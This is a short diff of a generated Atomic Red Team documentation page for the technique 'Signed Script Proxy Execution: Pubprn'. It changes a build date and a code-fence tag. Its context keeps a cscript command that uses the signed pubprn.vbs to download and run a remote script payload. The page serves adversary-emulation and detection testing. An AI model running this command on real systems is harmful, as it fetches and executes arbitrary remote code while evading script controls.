@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1216.001"
 attack_technique_name: "Signed Script Proxy Execution: Pubprn"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "9dd29a1f-1e16-4862-be83-913b10a88f6c"
@@ -50,7 +50,7 @@ Executes the signed PubPrn.vbs script with options to download and execute an ar
 
 ### Command
 
-```commandprompt
+```cmd
 cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
 ```
 
